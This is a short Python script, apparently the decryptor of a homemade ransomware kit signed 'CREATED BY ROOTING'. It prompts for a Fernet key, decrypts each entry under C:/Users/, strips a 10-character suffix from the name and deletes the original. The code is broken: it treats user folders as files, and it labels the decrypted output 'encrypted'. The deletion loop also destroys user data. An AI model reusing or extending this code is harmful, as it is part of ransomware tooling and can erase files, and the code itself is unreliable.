#CREATED BY ROOTING
import cryptography
from cryptography.fernet import Fernet
import os

key = input("la clé :")
def decrypt(x):
    input_file = x
    output_file = x[:-10]
    with open(input_file,'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.decrypt(data)
    with open(output_file,'wb') as f:
        f.write(encrypted)

for x in os.listdir('C:/Users/'):
    decrypt('C:/Users/'+ x);os.remove('C:/Users/'+ x)
    #CREATED BY ROOTING